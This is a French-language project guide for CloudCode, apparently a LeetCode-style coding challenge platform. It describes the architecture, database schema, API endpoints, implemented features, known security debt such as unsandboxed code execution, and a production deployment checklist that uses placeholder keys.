# CloudCode — Guide du Propriétaire

> Document complet : architecture, fonctionnalités, base de données, API, état actuel et ce qui manque.
> Mise à jour : mars 2026

---

## Table des Matières

1. [Vue d'ensemble](#1-vue-densemble)
2. [Stack technique](#2-stack-technique)
3. [Architecture](#3-architecture)
4. [Base de données](#4-base-de-données)
5. [Backend — Couches et Services](#5-backend--couches-et-services)
6. [API REST — Endpoints complets](#6-api-rest--endpoints-complets)
7. [Frontend — Pages et Composants](#7-frontend--pages-et-composants)
8. [Fonctionnalités implémentées](#8-fonctionnalités-implémentées)
9. [Fonctionnalités manquantes / À faire](#9-fonctionnalités-manquantes--à-faire)
10. [Plan de monétisation](#10-plan-de-monétisation)
11. [Lancer le projet](#11-lancer-le-projet)
12. [Configuration](#12-configuration)
13. [Conventions et patterns](#13-conventions-et-patterns)

---

## 1. Vue d'ensemble

CloudCode est une **plateforme de coding compétitif** style LeetCode, avec :

- **Challenges de code** : 55 challenges en mode fonction (Python + JavaScript), testés automatiquement
- **Mode VS** : 1v1 en temps réel avec système ELO
- **Cours** : Parcours d'apprentissage guidé
- **Classement** : Leaderboard global et par challenge
- **Administration** : Panel admin pour gérer challenges, cours, users

L'application tourne entièrement en local (SQLite) sans dépendances cloud.

---

## 2. Stack technique

| Couche | Technologie | Version |
|---|---|---|
| Backend | .NET / C# | 8.0 |
| ORM | Entity Framework Core | 8.x |
| Base de données | SQLite | — |
| Auth | JWT + Refresh Token | — |
| Real-time | SignalR | — |
| Frontend | Next.js (App Router) | 16.1 |
| UI Framework | React | 19.2 |
| Langage frontend | TypeScript | 5.x |
| CSS | Tailwind CSS | 4.x |
| Éditeur de code | Monaco Editor | 4.7 |
| Terminal | xterm.js | 6.0 |
| 3D | Three.js | 0.183 |
| State management | Zustand | 5.0 |
| HTTP client | Axios | 1.13 |
| Validation | FluentValidation | — |
| Mapping | AutoMapper | — |

---

## 3. Architecture

### Architecture Générale

```
CloudCode/
├── src/
│   ├── CloudCode.Domain/          # Entités, interfaces, enums
│   ├── CloudCode.Application/     # DTOs, interfaces services, validators
│   ├── CloudCode.Infrastructure/  # Implémentation services, EF Core, migrations
│   └── CloudCode.API/             # Controllers, SignalR Hubs, middleware
└── frontend/
    └── src/
        ├── app/                   # Pages (App Router Next.js)
        ├── components/            # Composants réutilisables
        ├── stores/                # State management (Zustand)
        ├── lib/                   # API client, utilitaires
        └── types/                 # Types TypeScript
```

### Pattern Backend : Clean Architecture

```
API Controller
    ↓ appelle
Application Service (Interface)
    ↓ implémenté par
Infrastructure Service
    ↓ utilise
Repository / DbContext (EF Core → SQLite)
```

**Règle** : chaque couche ne dépend que de la couche inférieure. Le Domain ne dépend de rien.

### Flux d'une requête typique

```
HTTP Request
→ JWT Middleware (vérifie token)
→ Controller (valide input, appelle service)
→ Service (logique métier)
→ Repository / DbContext (accès données)
→ SQLite
→ Response DTO
```

---

## 4. Base de données

### Schéma complet

```
Users (21 champs)
├── Id (Guid, PK)
├── Email (unique)
├── PasswordHash
├── Username (unique)
├── Avatar?
├── Bio?
├── EmailConfirmed
├── RefreshToken?
├── RefreshTokenExpiry?
├── IsAdmin
├── FirebaseUid? (nullable, index unique)
├── PasswordResetToken? (nullable, Guid-based token)
├── PasswordResetTokenExpiry? (nullable, DateTime, expiry 1h)
├── CreatedAt / UpdatedAt
│
├── → Projects (1-N, propriétaire)
├── → Collaborations (1-N, invité)
├── → UserSubmissions (1-N)
├── → UserProgress (1-N)
├── → VsMatches (N-N via Player1Id/Player2Id)
├── → VsRanks (1-1)
├── → AuditLogs (1-N)
└── → GitCredentials (1-N)

Projects (10 champs)
├── Id, Name, Description, Language
├── IsPublic, OwnerId, Tags (JSON)
├── CreatedAt / UpdatedAt
│
├── → CodeFiles (1-N, hiérarchique)
├── → Collaborations (1-N)
├── → ExecutionResults (1-N)
├── → ProjectDependencies (1-N)
└── → EnvironmentVariables (1-N)

CodeFiles (8 champs)
├── Id, Name, Path, Content (text)
├── IsFolder, ParentId?, ProjectId
└── (hiérarchique : parent/enfants)

Challenges (15 champs)
├── Id, Title, Slug (unique), Description (markdown)
├── Difficulty (1=Easy, 2=Medium, 3=Hard)
├── SupportedLanguages (1=Python, 2=JS, 3=Les deux)
├── StarterCodePython, StarterCodeJavaScript
├── TestRunnerPython, TestRunnerJavaScript
├── IsFunction (bool — mode LeetCode)
├── Tags (JSON), IsPublished
├── CreatedAt / UpdatedAt
│
├── → TestCases (1-N)
├── → UserSubmissions (1-N)
└── → UserProgress (1-N)

TestCases (7 champs)
├── Id, ChallengeId
├── Input, ExpectedOutput
├── IsHidden (bool — caché à l'user)
├── OrderIndex, Description?

UserSubmissions (10 champs)
├── Id, UserId, ChallengeId
├── Language, Code
├── Status (1=Pending … 6=Timeout)
├── PassedTests, TotalTests, Score
├── ExecutionTimeMs, ErrorOutput?
└── SubmittedAt

UserProgress (clé composite UserId+ChallengeId)
├── IsSolved, BestScore
├── AttemptCount, LastAttemptAt

Courses (7 champs)
├── Id, Title, Slug, Description
├── Language, OrderIndex, IsPublished
└── → CourseChallenges (1-N)

CourseChallenges
├── CourseId, ChallengeId, OrderIndex

VsMatches (14 champs)
├── Id, Player1Id, Player2Id, ChallengeId, WinnerId?
├── Status (1=Waiting, 2=InProgress, 3=Finished, 4=Cancelled)
├── Player1/2Language, Player1/2Submitted
├── Player1/2EloChange
└── StartedAt, FinishedAt?

VsRanks
├── UserId (unique), Elo (défaut 1000)
├── Wins, Losses, Draws
├── CurrentStreak, BestStreak
└── Tier calculé : Bronze/Silver/Gold/Platinum/Diamond/Master/Grandmaster

Collaborations
├── ProjectId, UserId, Role (1=Read, 2=Write, 3=Admin)
├── InvitedAt, AcceptedAt?, InvitedByEmail

ExecutionResults
├── ProjectId, FileId, UserId
├── Language, Code, Output, ErrorOutput
├── ExitCode, Status, ExecutionTime, MemoryUsedBytes

ProjectDependencies
├── ProjectId, Name, Version, Type
└── IsInstalled, InstalledAt?

EnvironmentVariables
├── ProjectId, Key, Value, IsSecret

AuditLogs
├── UserId, ProjectId?, Action, Details (JSON)
└── IpAddress, UserAgent

GitCredentials
├── UserId, Provider (github/gitlab/bitbucket)
├── Token, Username?
```

### Migrations appliquées

| Migration | Description |
|---|---|
| `20260103025621_InitialCreate` | Schéma complet initial |
| `20260109051158_AddProjectDependencies` | Table ProjectDependencies |
| `20260307021701_AddChallengeEntities` | Tables Challenges, TestCases, UserSubmissions, UserProgress |
| `20260309100000_AddChallengeFunctionMode` | Colonnes IsFunction, TestRunnerPython/JS sur Challenges |
| `20260310051932_AddStreakAndOfficialSolution` | Streak (ChallengeStreak, BestChallengeStreak, LastChallengeSolvedDate) sur User + OfficialSolutionPython/JS + Hints sur Challenge |
| `20260310130000_AddFirebaseUid` | Colonne `FirebaseUid` (nullable) sur Users + index unique |
| `20260310200000_AddPasswordReset` | Colonnes `PasswordResetToken` + `PasswordResetTokenExpiry` (nullable) sur Users |
| `20260311100000_AddChallengeComments` | Table `ChallengeComments` (Id, ChallengeId, UserId, Content, ParentId?, CreatedAt) avec FK cascade |

---

## 5. Backend — Couches et Services

### Domain (CloudCode.Domain)

**Entités** : User, Project, CodeFile, Challenge, TestCase, UserSubmission, UserProgress, Course, CourseChallenge, VsMatch, VsRank, Collaboration, ExecutionResult, ProjectDependency, EnvironmentVariable, AuditLog, GitCredential

**Enums** :
- `ProgrammingLanguage` — 15 langages (JS, Python, C#, Java, Go, TypeScript, HTML, CSS, JSON, Markdown, SQL, XML, YAML, Bash, Rust)
- `ChallengeDifficulty` — Easy(1), Medium(2), Hard(3)
- `ChallengeLanguage` — Python(1), JavaScript(2), Both(3)
- `SubmissionStatus` — Pending(1), Running(2), Passed(3), Failed(4), Error(5), Timeout(6)
- `VsMatchStatus` — Waiting(1), InProgress(2), Finished(3), Cancelled(4)
- `ExecutionStatus` — Pending, Running, Completed, Failed, Timeout, Cancelled
- `CollaboratorRole` — Read(1), Write(2), Admin(3)

### Application (CloudCode.Application)

**Services (interfaces)** :
| Interface | Rôle |
|---|---|
| `IAuthService` | Login, register, refresh token, reset password |
| `ITokenService` | Générer et valider JWT |
| `IProjectService` | CRUD projets |
| `IFileService` | CRUD fichiers dans un projet |
| `ICodeExecutionService` | Exécuter du code, capturer output |
| `ICollaborationService` | Partager projets, gérer collaborateurs |
| `IDependencyService` | Packages npm/pip par projet |
| `IEnvironmentService` | Variables d'environnement |
| `IAIService` | Intégration aide IA |
| `IFormattingService` | Formatter le code (black, prettier, gofmt) |
| `IGitService` | Opérations git (init, commit, push, pull) |
| `IGitCredentialService` | Stocker/récupérer tokens GitHub/GitLab |
| `IChallengeService` | CRUD challenges, leaderboard |
| `IJudgeService` | Exécuter et juger les soumissions |
| `ICourseService` | CRUD cours |
| `IVsService` | Gestion matchs compétitifs |
| `IMatchmakingService` | Trouver un adversaire pour VS mode |
| `IPortDetectionService` | Trouver ports disponibles |
| `IUserService` | Gestion utilisateurs (admin) |

### Infrastructure (CloudCode.Infrastructure)

**Pattern JudgeService** (le plus critique) :
```
Challenge en mode IsFunction=true
→ user écrit uniquement la fonction (ex: def two_sum(nums, target):)
→ JudgeService appelle BuildCode(userCode, testRunner) :
    code_complet = userCode + "\n" + testRunnerPython
→ Écrit dans fichier temp
→ Lance python3/node avec stdin = input du test case
→ Capture stdout, compare avec expectedOutput (normalisé)
→ Retourne passed/failed par test case
```

**FormattingService** :
- Python → `black --quiet -` (stdin/stdout)
- JavaScript/TypeScript → `npx prettier --parser babel`
- Go → `gofmt`
- Rust → `rustfmt --edition 2021`
- Si outil absent → retourne code original sans erreur

**GitService** : utilise `System.Diagnostics.Process` pour appeler `git` en CLI.

**ChallengeSeeder** : s'exécute au démarrage de l'app, upsert par slug (met à jour les existants, ajoute les nouveaux).

### API (CloudCode.API)

**SignalR Hubs** :
- `/hubs/code` — Collaboration temps réel (curseurs, modifications)
- `/hubs/terminal` — Terminal/output en streaming
- `/hubs/vs` — Matchmaking et résultats VS mode

**Middleware** :
- `ExceptionMiddleware` — Capture toutes les exceptions, retourne JSON structuré

---

## 6. API REST — Endpoints complets

### Auth (`/api/auth`)

| Méthode | Route | Description |
|---|---|---|
| POST | `/auth/login` | Login email/password → JWT |
| POST | `/auth/register` | Créer un compte |
| POST | `/auth/refresh` | Renouveler le JWT via refresh token |
| POST | `/auth/logout` | Invalider le refresh token |
| POST | `/auth/firebase` | Login/register via Firebase ID token (Google, email Firebase) |
| POST | `/auth/forgot-password` | Génère un token reset, envoie email via Resend |
| POST | `/auth/reset-password` | Vérifie token + email, met à jour le mot de passe |

### Challenges (`/api/challenges`)

| Méthode | Route | Auth | Description |
|---|---|---|---|
| GET | `/challenges` | ✓ | Liste tous les challenges publiés (+ isSolved par user) |
| GET | `/challenges/daily` | public | Challenge du jour (hash-based, change à minuit UTC) |
| GET | `/challenges/{slug}` | public | Détail d'un challenge |
| POST | `/challenges/{slug}/test` | ✓ | Tester le code (test cases visibles seulement, rate limit 30/min) |
| POST | `/challenges/{slug}/submit` | ✓ | Soumettre (tous les test cases, rate limit 15/min) |
| GET | `/challenges/{slug}/submissions` | ✓ | Historique des soumissions du user |
| GET | `/users/me/profile` | ✓ | Profil complet avec toutes les stats |
| PUT | `/users/me/profile` | ✓ | Modifier username, bio, avatar |
| GET | `/users/public/{username}` | public | Profil public d'un user (stats, streak, soumissions récentes) |
| GET | `/leaderboard` | public | Classement global |

### Admin Challenges (`/api/admin/challenges`)

| Méthode | Route | Auth | Description |
|---|---|---|---|
| GET | `/admin/challenges` | Admin | Tous les challenges (publiés + brouillons) |
| POST | `/admin/challenges` | Admin | Créer un challenge |
| PUT | `/admin/challenges/{id}` | Admin | Modifier un challenge |
| DELETE | `/admin/challenges/{id}` | Admin | Supprimer |
| POST | `/admin/challenges/{id}/publish` | Admin | Publier/dépublier |
| POST | `/admin/challenges/seed` | Admin | Relancer le seeder |

### Courses (`/api/courses`)

| Méthode | Route | Auth | Description |
|---|---|---|---|
| GET | `/courses` | ✓ | Liste des cours publiés |
| GET | `/courses/{slug}` | ✓ | Détail cours + challenges (avec isSolved) |
| GET | `/admin/courses` | Admin | Tous les cours |
| POST | `/admin/courses` | Admin | Créer |
| PUT | `/admin/courses/{id}` | Admin | Modifier |
| DELETE | `/admin/courses/{id}` | Admin | Supprimer |
| POST | `/admin/courses/{id}/publish` | Admin | Publier/dépublier |

### VS Mode (`/api/vs`)

| Méthode | Route | Auth | Description |
|---|---|---|---|
| GET | `/vs/rank` | ✓ | Mon ELO et stats |
| GET | `/vs/rank/{userId}` | ✓ | ELO d'un autre user |
| GET | `/vs/leaderboard` | ✓ | Classement compétitif |
| GET | `/vs/matches` | ✓ | Mon historique de matchs |
| GET | `/vs/matches/{id}` | ✓ | Détail d'un match |
| POST | `/vs/matches/{id}/submit` | ✓ | Soumettre code dans un match |
| POST | `/vs/matches/{id}/forfeit` | ✓ | Abandonner un match |

### Projets (`/api/projects`)

| Méthode | Route | Description |
|---|---|---|
| GET | `/projects` | Mes projets |
| POST | `/projects` | Créer un projet |
| GET | `/projects/{id}` | Détail projet |
| PUT | `/projects/{id}` | Modifier |
| DELETE | `/projects/{id}` | Supprimer |
| GET | `/projects/{id}/files` | Arborescence de fichiers |
| GET | `/projects/{id}/download` | Télécharger en ZIP |

### Fichiers (`/api/files`)

| Méthode | Route | Description |
|---|---|---|
| GET | `/files/{id}` | Lire un fichier |
| POST | `/files` | Créer un fichier/dossier |
| PUT | `/files/{id}` | Modifier contenu |
| DELETE | `/files/{id}` | Supprimer |
| POST | `/files/{id}/rename` | Renommer |

### Exécution (`/api/execution`)

| Méthode | Route | Description |
|---|---|---|
| POST | `/execution/run` | Exécuter du code |

### Formatage (`/api/format`)

| Méthode | Route | Body | Description |
|---|---|---|---|
| POST | `/format` | `{ code, language }` | Formatter le code |

### Git (`/api/projects/{id}/git`)

| Méthode | Route | Description |
|---|---|---|
| POST | `/git/init` | Initialiser un repo |
| GET | `/git/status` | Voir les fichiers modifiés |
| GET | `/git/diff` | Voir les diffs |
| POST | `/git/stage` | Stager tous les fichiers |
| POST | `/git/commit` | Commit avec message |
| POST | `/git/push` | Push vers remote |
| POST | `/git/pull` | Pull depuis remote |
| GET | `/git/branches` | Lister les branches |
| POST | `/git/checkout` | Changer/créer branche |
| GET | `/git/log` | Historique commits |
| POST | `/git/remote` | Définir l'URL remote |

### Git Credentials (`/api/git/credentials`)

| Méthode | Route | Description |
|---|---|---|
| POST | `/git/credentials` | Sauvegarder token GitHub/GitLab |
| GET | `/git/credentials` | Voir mes credentials |
| DELETE | `/git/credentials/{provider}` | Supprimer |

### Collaboration (`/api/collaborations`)

| Méthode | Route | Description |
|---|---|---|
| GET | `/collaborations/{projectId}` | Collaborateurs d'un projet |
| POST | `/collaborations/{projectId}/invite` | Inviter par email |
| DELETE | `/collaborations/{projectId}/{userId}` | Retirer un collaborateur |

### Admin Users (`/api/admin/users`)

| Méthode | Route | Description |
|---|---|---|
| GET | `/admin/users` | Tous les utilisateurs |
| POST | `/admin/users/{id}/toggle-admin` | Donner/retirer admin |
| DELETE | `/admin/users/{id}` | Supprimer un user et toutes ses données (cascade SQL raw + PRAGMA FK OFF) |

---

## 7. Frontend — Pages et Composants

### Pages (Next.js App Router)

| Route | Page | Description |
|---|---|---|
| `/` | `app/page.tsx` | Landing page (3D hero, stats, challenge du jour, leaderboard preview) |
| `/login` | `app/login/page.tsx` | Formulaire de connexion |
| `/register` | `app/register/page.tsx` | Formulaire d'inscription |
| `/challenges` | `app/challenges/page.tsx` | Liste des challenges (filtres difficulty/language/tags, recherche) |
| `/challenges/[slug]` | `app/challenges/[slug]/page.tsx` | IDE challenge (éditeur Monaco, run/submit, résultats, timer, historique) |
| `/leaderboard` | `app/leaderboard/page.tsx` | Classement global |
| `/courses` | `app/courses/page.tsx` | Liste des cours |
| `/courses/[slug]` | `app/courses/[slug]/page.tsx` | Cours avec liste de challenges et progression |
| `/vs` | `app/vs/page.tsx` | Accueil VS mode (ELO, recherche adversaire, historique) |
| `/vs/[matchId]` | `app/vs/[matchId]/page.tsx` | Match en cours (IDE dual, timer, résultats temps réel) |
| `/admin/challenges` | Admin challenges | Tableau de bord challenges |
| `/admin/challenges/new` | Admin challenges | Créer challenge |
| `/admin/challenges/[id]/edit` | Admin challenges | Modifier challenge |
| `/admin/courses` | Admin courses | Tableau de bord cours |
| `/admin/courses/new` | Admin courses | Créer cours |
| `/admin/courses/[id]/edit` | Admin courses | Modifier cours |
| `/profile` | `app/profile/page.tsx` | Profil utilisateur (stats, ELO VS, difficulty breakdown, langages, soumissions récentes, modifier bio/username) |
| `/u/[username]` | `app/u/[username]/page.tsx` | Profil public read-only d'un utilisateur |
| `/admin/users` | Admin users | Gérer utilisateurs (liste, promouvoir/rétrograder, supprimer) |
| `/forgot-password` | `app/forgot-password/page.tsx` | Formulaire de demande de reset de mot de passe |
| `/reset-password` | `app/reset-password/page.tsx` | Formulaire de saisie du nouveau mot de passe (token en query param) |

### Composants

| Composant | Description |
|---|---|
| `AnimatedLogo` | Logo CloudCode animé |
| `Navbar` | Barre de navigation partagée (Challenges/Courses/Leaderboard/VS Mode/Admin, avatar, logout, mobile menu) |
| `SoundControl` | Bouton on/off effets sonores |
| `three/HeroScene` | Scène Three.js pour la landing page |

### State Management (Zustand)

| Store | État | Actions |
|---|---|---|
| `authStore` | user, isAuthenticated, isLoading, error | login, register, logout, checkAuth, setUser, clearError |

Persisté dans `localStorage` (accessToken, refreshToken).

### lib/api.ts — Clients API

| Client | Endpoints exposés |
|---|---|
| `authApi` | login, register, logout, refresh |
| `challengesApi` | getAll, getDaily, getBySlug, test, submit, getSubmissions, getLeaderboard + admin CRUD |
| `coursesApi` | getAll, getBySlug + admin CRUD |
| `vsApi` | getMyRank, getRank, getLeaderboard, getMatch, getHistory, submit, forfeit |
| `profileApi` | getMyProfile, updateMyProfile, getPublicProfile(username) |
| `formattingApi` | format(code, language) |
| `adminUsersApi` | getAll, toggleAdmin, deleteUser |

**Intercepteurs Axios** :
- Request → injecte `Authorization: Bearer {token}`
- Response 401 → tente refresh token automatique → redirige vers `/login` si échec

---

## 8. Fonctionnalités implémentées

### ✅ Challenges (COMPLET)

- **55 challenges** en base de données, tous publiés (31 Easy, 17 Medium, 7 Hard)
- Format fonction LeetCode : l'user écrit uniquement la fonction
- Python + JavaScript supportés (la plupart supportent les deux)
- Test cases visibles (exemples) + cachés (soumission complète)
- **259 test cases** vérifiés et fonctionnels
- Score par soumission
- Historique des soumissions (clic pour recharger le code)
- Timer de résolution
- **Persistance du code** : localStorage par user+challenge+langage, survit à la déconnexion et fermeture du navigateur
- Format code (Alt+Shift+F) — Python via black
- Reset au starter code
- Raccourcis clavier : Ctrl+Enter (Run), Ctrl+Shift+Enter (Submit)
- **Bouton Random** : navigue vers un challenge aléatoire parmi les challenges filtrés
- **Hints** : jusqu'à 3 indices débloquables un par un (stockés en JSON dans `Challenge.Hints`)
- **Solution officielle** : tab "Solution" visible uniquement après résolution complète (score 100), affiche Python et/ou JS

### ✅ Challenges — Catégories couvertes

| Catégorie | Challenges |
|---|---|
| Arrays | Two Sum, Max Subarray, Remove Duplicates, Array Intersection, Rotate Array, Missing Number, Contains Duplicate, Majority Element, Product Except Self, Merge Sorted Arrays |
| Strings | Reverse String, Palindrome, Anagram, Count Vowels, Longest Common Prefix, Capitalize Words, String Length, Roman to Integer, Longest Substring No Repeat, Min Window Substring |
| Math | Fibonacci, Factorial, FizzBuzz, Power, Sum of Digits, Find GCD, Is Even |
| Dynamic Programming | Climbing Stairs, Coin Change, Unique Paths, Jump Game, Longest Increasing Subsequence, Edit Distance |
| Two Pointers / Sliding Window | Max Subarray, Container Most Water, Three Sum, Trapping Rain Water |
| Matrix | Spiral Matrix, Valid Sudoku, Word Search |
| Linked Lists | Linked List Cycle Detection |
| Trees / BFS | Tree Depth (Serialize Binary Tree) |
| Hashing | Group Anagrams, LRU Cache |
| Backtracking | N-Queens |
| Scheduling | Job Scheduling |
| Binary Search | Binary Search, Median Two Sorted Arrays |
| Miscellaneous | Valid Parentheses, Flatten List, Max Element |

### ✅ Quiz Mode (COMPLET)

- **Quiz Solo** (`/quiz`) — QCM, 10 questions, 30 secondes par question, score à la fin
- 5 catégories : Python, JavaScript, Algorithms, Data Structures, General CS
- 3 niveaux : Easy, Medium, Hard
- 30 questions en base (6 par catégorie), seeder automatique
- Révèle la bonne réponse + explication après chaque question
- Historique des sessions
- **Quiz VS** (`/quiz/vs`) — 1v1 temps réel via SignalR
- Matchmaking par catégorie + difficulté
- Premier correct = 2 pts, les deux corrects = 1 pt chacun
- 10 questions simultanées, résultat question par question
- Système ELO (K=32) + tiers identiques au VS Code
- Leaderboard compétitif

### ✅ VS Mode (COMPLET)

- Matchmaking temps réel via SignalR
- Système ELO (défaut 1000)
- Tiers : Bronze → Silver → Gold → Platinum → Diamond → Master → Grandmaster
- Matchs 1v1 sur un même challenge aléatoire
- Soumission simultanée, premier qui passe tous les tests gagne
- Historique des matchs
- Leaderboard compétitif

### ✅ Cours (COMPLET)

- Cours Python et JavaScript
- Challenges ordonnés dans chaque cours
- Progression : isSolved par challenge
- Admin : créer, modifier, ordonner, publier/dépublier

### ✅ Authentification (COMPLET)

- JWT Access Token (durée configurable)
- Refresh Token (persisté en DB)
- Refresh automatique côté frontend (intercepteur Axios)
- Hashage bcrypt des mots de passe
- Rôles : User et Admin
- **Firebase Auth** : email verification automatique à l'inscription, Google Sign-In
  - Backend : `POST /api/auth/firebase` — vérifie Firebase ID token, crée/lie le compte, émet JWT custom
  - Frontend : `lib/firebase.ts`, authStore mis à jour (login, register, loginWithGoogle)
  - Google Sign-In via popup — username auto-dérivé du displayName Google (suffixe aléatoire si déjà pris)
  - Fusion de comptes : lookup par `FirebaseUid` puis par email pour migrer les anciens comptes
  - Config : `firebase_key.json` à la racine du projet (service account), `.env.local` pour les clés web
- **Reset de mot de passe natif** (flow token en DB, standard OWASP) :
  - Page `/forgot-password` → saisit email → `POST /api/auth/forgot-password`
  - Backend génère un token Guid, stocké en DB (expiry 1h), envoie email via Resend
  - Page `/reset-password?token=xxx` → saisit email + nouveau mot de passe
  - `POST /api/auth/reset-password` vérifie token + email, met à jour hash, efface le token
  - Fonctionne pour tous les comptes (email pur, compte Firebase/Google hybride)
  - En dev : lien de reset loggé dans la console backend (`=== PASSWORD RESET LINK ===`)

### ✅ Leaderboard (COMPLET)

- Classement par score total
- Nombre de challenges résolus
- Perfect scores (100%)
- Filtres par période (all, week, month)

### ✅ Discussion par challenge (COMPLET)

- Interface chat style iMessage/WhatsApp sous chaque challenge
- Messages envoyés (droite, dégradé violet) vs reçus (gauche, verre sombre)
- Couleurs d'avatar uniques par utilisateur (palette de 8 couleurs, hash-based)
- Indicateur de frappe animé (3 points qui rebondissent)
- Auto-scroll vers le dernier message
- Réponses imbriquées (1 niveau de thread)
- Badge d'unread count sur l'onglet Discussion
- Suppression de commentaire (auteur ou admin)
- Backend : `ChallengeCommentsController` avec `GET/POST/DELETE /api/challenges/{slug}/comments`

### ✅ Page Profil (COMPLET)

- Stats challenges : résolus, score total, Easy/Medium/Hard breakdown
- Stats VS : ELO, Tier (Bronze→Grandmaster), Wins/Losses
- Statistiques soumissions : total, Python vs JavaScript (barre visuelle)
- 10 soumissions récentes cliquables (redirige vers le challenge)
- Modifier username et bio inline
- Avatar avec initiale + glow selon tier
- Accessible via clic sur l'avatar dans le header `/challenges`
- **Streak journalier** : Current Streak 🔥 + Best Streak 🏆 (calculé dans JudgeService au moment du solve)
- **Heatmap d'activité** : grille GitHub-style 365 jours, intensité colorée selon le nombre de soumissions
- **Badges & Achievements** : 16 badges (common/rare/epic/legendary), calculés depuis les stats existantes, earned + locked

### ✅ Phase Engagement (COMPLET)

- **Rate limiting** : 30 tests/min, 15 soumissions/min par IP (ASP.NET Sliding Window)
- **IntelliSense Monaco** : autocomplétion avancée Python + JavaScript (50+ builtins, méthodes, snippets algorithmiques)
- **Challenge du jour** : banner sur `/challenges` avec countdown avant réinitialisation, sélection déterministe par hash du jour UTC
- **Profil public `/u/{username}`** : page read-only avec stats, difficulty breakdown, streak, soumissions récentes — accessible sans connexion
- **Partage challenge** : bouton Share dans l'onglet Description → copie l'URL → feedback "Copied!" 2s
- **Usernames cliquables** dans le leaderboard → redirige vers le profil public
- **Leaderboard public** : accessible sans connexion
- **Navbar partagée** : composant `Navbar.tsx` unique utilisé sur Challenges, Courses, Leaderboard, VS Mode — active state, mobile menu, logout, avatar
- **Animations background** : orbes animés (radial gradient, ease-in-out) sur Leaderboard et profil public

### ✅ Admin (COMPLET)

- Tableau de bord challenges : créer, modifier, publier, supprimer
- Tableau de bord cours : idem
- Gestion utilisateurs : liste, donner/retirer les droits admin, **supprimer un user** (suppression en cascade via EF Core RemoveRange — VsMatches via raw SQL car colonne manquante en DB)
- Dashboard `/admin` : KPIs (users, soumissions, challenges, VS matches), graphique 14 jours, top challenges
- Seeder : relancer l'injection des challenges depuis l'API

### ✅ Logging (COMPLET)

- `[Auth]` : chaque action register/login/logout/firebase/refresh loggée avec `Console.WriteLine`
- `[Comments]` : GET/POST/DELETE commentaires avec slug, userId, résultat
- `[DeleteUser]` : suppression user step-by-step (comments, submissions, progress, VS, projects, user)

---

## 9. Ce qui reste à faire pour une app 100% fonctionnelle

> Mise à jour : mars 2026 — après implémentation du système Premium Stripe complet.

---

### ✅ Fonctionnalités implémentées (état actuel)

| Catégorie | Détail |
|---|---|
| **Challenges** | 51 challenges (Easy/Medium/Hard), mode fonction, Python + JS, hints, solution officielle, streak, challenge du jour, leaderboard |
| **VS Mode** | Matchmaking ELO temps réel, SignalR, historique, classement |
| **Quiz** | Solo (10 questions, timer, score) + VS 1v1 (SignalR, 5 questions) |
| **Cours** | Parcours Python + JS avec leçons et exercices |
| **Premium / Stripe** | Checkout Session, webhooks, annulation, gating Courses/Quiz/VS/Hard challenges |
| **Profil** | Stats, heatmap, badges, profil public `/u/{username}` |
| **Auth** | Email/password, Google Sign-In (Firebase), reset password, email vérification |
| **Admin** | Panel admin, CRUD challenges, gestion users, stats globales |
| **Sécurité** | Rate limiting, CORS, validation DTOs, JWT rotation |

---

### 🔴 À faire — Critique (app incomplète sans ça)

| # | Quoi | Où | Effort |
|---|---|---|---|
| 1 | **Badge Premium + bouton annuler** sur `/profile` | `frontend/src/app/profile/page.tsx` | 1h |
| 2 | **Toggle premium admin** dans le panel admin (activer/désactiver pour un user) | `AdminUsersController` + page admin | 2h |
| 3 | **Appliquer la migration** `AddPremiumToUsers` sur la DB de prod | `dotnet ef database update` | 5min |
| 4 | **Vérifier domaine Resend** (DNS) pour envoyer des emails à n'importe qui | resend.com → Domains | 30min |
| 5 | **Secrets hors du code** — JWT, Resend, Stripe dans variables d'env | `appsettings.json` → env vars | 1h |

---

### 🟡 À faire — Important pour le lancement

| # | Quoi | Détail | Effort |
|---|---|---|---|
| 6 | **Hébergement public** | Railway (backend .NET + DB) + Vercel (frontend) | 2–4h |
| 7 | **Domaine custom** | Acheter sur Namecheap/Cloudflare, configurer DNS | 1h |
| 8 | **HTTPS** | Obligatoire pour Stripe. Inclus sur Railway/Vercel | Automatique |
| 9 | **Stripe live keys** | Remplacer les clés test par les clés live + configurer webhook prod | 30min |
| 10 | **`App:FrontendUrl`** en prod | Mettre l'URL réelle du frontend (ex: `https://cloudcode.io`) | 5min |
| 11 | **Sandboxer l'exécution de code** | Docker par soumission (réseau off, timeout, mémoire limitée) — risque sécurité | 1–2 jours |

---

### 🟢 À faire — Nice-to-have (après lancement)

| # | Quoi | Détail |
|---|---|---|
| 12 | **Notifications email** | Streak en danger, résultat VS, nouveau challenge |
| 13 | **PostgreSQL** | Remplacer SQLite (concurrent writes en prod) |
| 14 | **Tests automatisés** | xUnit backend + Jest/Playwright frontend |
| 15 | **Backup DB automatique** | Cron SQLite → S3 ou fichier local |
| 16 | **Contests / compétitions** | Challenge avec deadline + classement temporaire |
| 17 | **JWT httpOnly cookie** | Sécurité XSS (actuellement localStorage) |

---

### 🚀 Checklist mise en production (dans l'ordre)

```
□ 1. Vérifier domaine sur Resend (DNS TXT)
□ 2. Créer compte Railway → déployer backend .NET
□ 3. Créer DB PostgreSQL sur Railway (ou garder SQLite au début)
□ 4. Appliquer toutes les migrations EF Core sur la DB prod
□ 5. Configurer variables d'environnement sur Railway :
      Jwt__SecretKey=<32+ chars aléatoires>
      Resend__ApiKey=re_xxx
      Stripe__SecretKey=sk_live_xxx
      Stripe__PriceId=price_xxx
      Stripe__WebhookSecret=whsec_xxx
      App__FrontendUrl=https://ton-domaine.com
□ 6. Déployer frontend sur Vercel → connecter au backend Railway
□ 7. Configurer domaine custom sur Railway + Vercel
□ 8. Créer webhook Stripe prod → URL : https://api.ton-domaine.com/api/premium/webhook
□ 9. Tester checkout complet avec carte live $0,50
□ 10. Activer HSTS dans Program.cs
```

---

### 🔧 Dette technique existante

| Problème | Impact | Solution |
|---|---|---|
| **Exécution code non sandboxée** | Risque sécurité critique | Docker par exécution |
| **JWT dans localStorage** | Vulnérabilité XSS | Migrer vers httpOnly cookies |
| **SQLite en production** | Corruption si trafic concurrent | Migrer vers PostgreSQL |
| **Pas de tests automatisés** | Régressions difficiles à détecter | xUnit + Jest |
| **Pas de backup DB** | Perte de données possible | Cron backup → S3 |

### ✅ Sécurité implémentée (mars 2026)

| Mesure | Détail |
|---|---|
| **Rate limiting auth** | Login : 10/min · Register : 5/min · ForgotPassword : 3/5min · Refresh : 20/min |
| **Rate limiting code** | Submit : 15/min · Test : 30/min · Comments : 10/min |
| **CORS restrictif** | Méthodes explicites (GET/POST/PUT/DELETE) · Headers explicites (Authorization/Content-Type) |
